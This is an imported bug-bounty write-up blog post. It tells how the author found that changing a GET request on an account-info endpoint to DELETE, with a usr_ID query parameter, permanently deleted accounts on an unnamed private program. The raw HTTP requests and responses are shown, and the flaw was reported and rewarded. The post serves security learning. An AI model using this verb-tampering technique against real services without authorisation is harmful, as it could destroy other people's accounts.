---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-12-15_authorization-bug-that-every-bug-hunter-missed-on-a-popular-program.md
original_filename: 2019-12-15_authorization-bug-that-every-bug-hunter-missed-on-a-popular-program.md
title: Authorization bug that every bug hunter missed on a popular program
category: documents
detected_topics:
- access-control
- idor
- xss
- command-injection
- automation-abuse
- csrf
tags:
- imported
- documents
- access-control
- idor
- xss
- command-injection
- automation-abuse
- csrf
language: en
raw_sha256: 23eb713118149c1f9b5cc1bb84d244e3488b80c9be06fd2f86d839cc5b7aca55
text_sha256: d3048f6718c3ed53b9727e66ec0b19f5e4409d879c441f7be31e8703889b14c3
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Authorization bug that every bug hunter missed on a popular program

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-12-15_authorization-bug-that-every-bug-hunter-missed-on-a-popular-program.md
- Source Type: markdown
- Detected Topics: access-control, idor, xss, command-injection, automation-abuse, csrf
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `23eb713118149c1f9b5cc1bb84d244e3488b80c9be06fd2f86d839cc5b7aca55`
- Text SHA256: `d3048f6718c3ed53b9727e66ec0b19f5e4409d879c441f7be31e8703889b14c3`


## Content

---
title: "Authorization bug that every bug hunter missed on a popular program"
url: "https://fellchase.blogspot.com/2019/12/authorization-bug-that-every-bug-hunter-missed-on-a-popular-program.html"
final_url: "https://fellchase.blogspot.com/2019/12/authorization-bug-that-every-bug-hunter-missed-on-a-popular-program.html"
authors: ["Ajinkya Pathare (@fellchase)"]
bugs: ["Broken authorization"]
publication_date: "2019-12-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4888
---

###  Authorization bug that every bug hunter missed on a popular program 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

[ Sunday, December 15, 2019  ](https://fellchase.blogspot.com/2019/12/authorization-bug-that-every-bug-hunter-missed-on-a-popular-program.html "permanent link")

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-N7Ho1k_Zl0a3Z5FTKJBgANfQoMa0k68UAhsvZvLrrHqJO6f36Vwta91fVdQDfRocsg6vegCmiivFFCNG2QrYIPt9Q0IpiADs82_zl49P9TBarSVyLfFIh_dl3giYAOujqIAIGbPhDt0h/s1600/zvHhKiVuR9M.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-N7Ho1k_Zl0a3Z5FTKJBgANfQoMa0k68UAhsvZvLrrHqJO6f36Vwta91fVdQDfRocsg6vegCmiivFFCNG2QrYIPt9Q0IpiADs82_zl49P9TBarSVyLfFIh_dl3giYAOujqIAIGbPhDt0h/s1600/zvHhKiVuR9M.png)

  
A story of broken access control bug I found while hunting with my friend who is a top bug hunter, huge thanks to him for sharing scope of this private program, as it is a private program I'm forbidden from disclosing name of program and the person.  
  
It started on a fine evening when my friend asked me to collaborate with him on a private program for fun and my learning.  
  
We were chatting & I was learning his methodology & how he approaches targets, in a few minutes he found few XSS on a sub-domain but that was OOS then he demonstrated how he generally checks everything, meanwhile I was struggling to keep pace with his findings and replies on chat meanwhile I had just signed up for an account on the site and Burp was logging all the traffic.  
  
After a while he was done finding XSS & CSRF and went offline I was also kind of demotivated after he went offline thinking that program being so old and popular among bug hunters there will not be any low hanging fruits especially because H1 elite were in Hall of Fame of the program. Nevertheless, I thought I should at least go through basic functions of site at least for the sake of learning so I visited account settings.  
  
While moving through it I found an endpoint which would return details of the account like usr_ID.  
  

####  Request

> GET /backend/usrInfo?type=true HTTP/1.1  
>  Connection: close  
>  Accept: application/json  
>  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36  
>  Cookie: REDACTED;

####  Response 

> HTTP/1.1 200 OK  
>  Content-Type: application/json;charset=UTF-8  
>  
>  {  
>  "usr_ID": "da947ed5-c518-4264-a768-6a36f46dfc8d",  
>  "info": { REDACTED }  
>  }

  
While tinkering with account info request I changed HTTP Verb from _GET_ to _DELETE_ and to my surprise it gave an error saying that "_Usr id cannot be empty_ "

####  Tampered Request

> DELETE /backend/usrInfo?type=true HTTP/1.1  
>  Connection: close  
>  Accept: application/json  
>  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36  
>  Cookie: REDACTED;

####  Response 

> HTTP/1.1 200 OK  
>  Content-Type: application/json;charset=UTF-8  
>  Content-Length: 2020  
>  Vary: Accept-Encoding  
>  
>  {  
>  "resp": "ERROR",  
>  "code": "INCORRECT_USR_ID",  
>  "cause": "Usr id cannot be empty"  
>  }

  
So naturally I tried sending the parameters through HTTP request body but it gave error again as usr_ID not being included so I added usr_ID parameter in the query string then it gave 200 response, I was perplexed thinking that it's just 200 response and account wouldn't have been deleted but it was, actually deleted permanently. 

####  Tampered Request

> DELETE /backend/usrInfo?usr_ID=da947ed5-c518-4264-a768-6a36f46dfc8d HTTP/1.1  
>  Connection: close  
>  Accept: application/json  
>  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36  
>  Content-Type: application/json  
>  Accept-Encoding: gzip, deflate  
>  Accept-Language: en-GB,en-US;q=0.9,en;q=0.8  
>  Cookie: REDACTED

####  Response

> HTTP/1.1 200 OK  
>  Content-Type: application/json;charset=UTF-8  
>  Vary: Accept-Encoding  
>  Accept-Ranges: bytes

  
I immediately notified the company about the vulnerability & the team acknowledged that bug was valid, but exploiting the vulnerability required having access to usr_ID of victim which attacker couldn't, so severity of my bug was lowered. Though the security team was happy to raise bounty if I could find a way to harvest usr_ID. Unfortunately I failed in doing that as usr_ID being a UUID was not guessable, also there was no common meeting point between accounts so attacker couldn't get access to victims usr_ID.  

##  Impact

The Impact of this bug is debatable since I was unable to find a way to get the victim's UUID so this bug becomes theoretical sort of, yet the security team was kind enough to accept it and issue a bounty for this. Always try to find a way to get the username or ID of victim it's easy to do if the vulnerable site is a social network.

##  Why this went unnoticed?

  * Maybe because no one tried changing the HTTP Verb assuming it's tested for by someone else.
  * No one bothered to find right location for usr_ID 
  * Perhaps no one thought that the account settings page which appeared to be very basic could have a bug like this. 
  * Most of people check for CSRF on account delete endpoint not for IDOR/BAC on it that often, especially when they don't see a parameter to put ID in they don't try.

##  Takeaway

Security by assumption is bad idea, for defenders and also for attackers.  
  
Most of the hunters including me usually assume that program is well tested and there couldn't be any low hanging fruits left, especially in a place like account settings page and that bug couldn't be found by tinkering with simple things like HTTP verbs and adding few parameters at the end of URL.  
  
Initially while beginning the test with my friend, I never thought that, this night I'll end up finding a bug in 5-10 minutes. Usually for me it takes a long time to find bugs but bugs are there! Even on supposedly well tested areas of popular programs.  
  
Actually I found similar bug on some other site it was an open redirect and I found it by guessing that the endpoint maybe receiving a parameter, comment if you want to hear story behind that!

  
Hope you enjoyed this little post, do comment below if you liked the post or if you want to get in touch with me, or suggest any changes contact me [@fellchase](https://twitter.com/fellchase)

[broken access control](https://fellchase.blogspot.com/search/label/broken%20access%20control) [bug bounty](https://fellchase.blogspot.com/search/label/bug%20bounty) [write up](https://fellchase.blogspot.com/search/label/write%20up)

[ Ajinkya Pathare  ]( "author profile")

Guy with a business degree interested in finance, web security and programming 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

### Comments

  1. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[imran nazir parray](https://www.blogger.com/profile/12286317138047894473)[Wednesday, January 08, 2020 1:00:00 pm](https://fellchase.blogspot.com/2019/12/authorization-bug-that-every-bug-hunter-missed-on-a-popular-program.html?showComment=1578468649984#c588307235087368722)

Nice Write-up ! Keep the good work up.

Reply[Delete](https://www.blogger.com/comment/delete/7751137191614975110/588307235087368722)

Replies

  1. ![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifu6xTd-JfYfIbIOSrsUMIPmfRiv9XaCnwSrS-d_zrncJM7nx0VxPbe4ALgo1ZynfjJ_hScjvC0fNTVv-CJCfFzv1-GRwDW6WocS0pCvD9Yta-qWW8IS2G3xuwj701tWwODARDkEusBP1SdQ2XAkVK4D-GqKBiBU1rEVOcDfZawpgDZDQ/s45/moss%20twitter.jpg)

[Ajinkya Pathare](https://www.blogger.com/profile/04995339911418332086)[Thursday, January 09, 2020 11:09:00 am](https://fellchase.blogspot.com/2019/12/authorization-bug-that-every-bug-hunter-missed-on-a-popular-program.html?showComment=1578548393000#c4193129422473258280)

Thank you bro 

[Delete](https://www.blogger.com/comment/delete/7751137191614975110/4193129422473258280)

Replies

Reply

Reply

  2. ![](//www.blogger.com/img/blogger_logo_round_35.png)

[Wini](https://www.blogger.com/profile/09568223494983888066)[Tuesday, March 10, 2020 2:27:00 pm](https://fellchase.blogspot.com/2019/12/authorization-bug-that-every-bug-hunter-missed-on-a-popular-program.html?showComment=1583830657761#c8031187828045232954)

Great writeup, Thanks for sharing this!

Reply[Delete](https://www.blogger.com/comment/delete/7751137191614975110/8031187828045232954)

Replies

  1. ![](//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEifu6xTd-JfYfIbIOSrsUMIPmfRiv9XaCnwSrS-d_zrncJM7nx0VxPbe4ALgo1ZynfjJ_hScjvC0fNTVv-CJCfFzv1-GRwDW6WocS0pCvD9Yta-qWW8IS2G3xuwj701tWwODARDkEusBP1SdQ2XAkVK4D-GqKBiBU1rEVOcDfZawpgDZDQ/s45/moss%20twitter.jpg)

[Ajinkya Pathare](https://www.blogger.com/profile/04995339911418332086)[Friday, March 27, 2020 2:02:00 am](https://fellchase.blogspot.com/2019/12/authorization-bug-that-every-bug-hunter-missed-on-a-popular-program.html?showComment=1585254756016#c6610383887529875627)

Glad you liked it 

[Delete](https://www.blogger.com/comment/delete/7751137191614975110/6610383887529875627)

Replies

Reply

Reply

Add comment

Load more...

#### Post a Comment

[](https://www.blogger.com/comment/frame/7751137191614975110?po=674499190951189500&hl=en-GB&saa=85391&origin=https://fellchase.blogspot.com&skin=contempo)
